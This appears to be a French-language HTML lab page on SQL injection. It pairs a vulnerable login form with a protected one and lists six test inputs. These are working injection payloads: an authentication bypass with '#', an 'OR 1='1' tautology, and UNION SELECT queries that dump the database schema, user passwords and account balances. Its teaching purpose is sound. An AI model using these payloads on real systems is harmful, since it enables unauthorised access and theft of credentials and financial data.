<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>La faille SQLi : SQL injection</h1>

    <h2>Req non protégée</h2>
    <form action="sql_vulnerable.php" method="post">
        <label for="">Login : </label><input type="text" name="login" required>
        <br>
        <label for="">Password : </label><textarea name="password" id="" required></textarea>
        <br>
        <input type="submit" value="Login">
    </form>

    <h2>Req protégée</h2>
    <form action="sql_solide.php" method="post">
        <label for="">Login : </label><input type="text" name="login" required>
        <br>
        <label for="">Password : </label><textarea name="password" id="" required></textarea>
        <br>
        <input type="submit" value="Login">
    </form>

    <h2>Les tests à dérouler</h1>
    <dl>
        <dt>Test 1 : Accès normal</dt>
        <dd>login=(pierre) password=(654321) : les comptes de pierre s'affichent</dd>
        <br>
        <dt>Test 2 : Bypass d'authentification</dt>
        <dd>login=(pierre'#) password=(coucou) : les comptes de pierre s'affichent quand même</dd>
        <br>
        <dt>Test 3 : Injection d'évaluation true</dt>
        <dd>login=(coucou) password=(coucou' OR 1='1) : tous les comptes s'affichent</dd>
        <br>
        <dt>Test 4 : Evasion de la table cible</dt>
        <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT database(), t.table_name, concat(c.column_name,':',c.data_type) FROM information_schema.tables AS t NATURAL JOIN information_schema.columns AS c WHERE table_schema = database() # ) : la structure de la base s'affiche</dd>
        <br>
        <dt>Test 5 : Evasion des données d'une table</dt>
        <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT login, pass, id FROM users # ) : les users s'affichent avec les passwords</dd>
        <br>
        <dt>Test 6 : Evasion de toutes les données</dt>
        <dd>login=(coucou) password=(blabla' AND 1=0 UNION SELECT concat('User = ' , A.id,':',A.login, ":", A.pass), concat('Account = ' , B.id,':',B.type), B.amount FROM users AS A JOIN accounts AS B WHERE B.id_users = A.id # ) : toutels les données des users avec leurs comptes s'affichent</dd>
    </dl>

</body>
</html>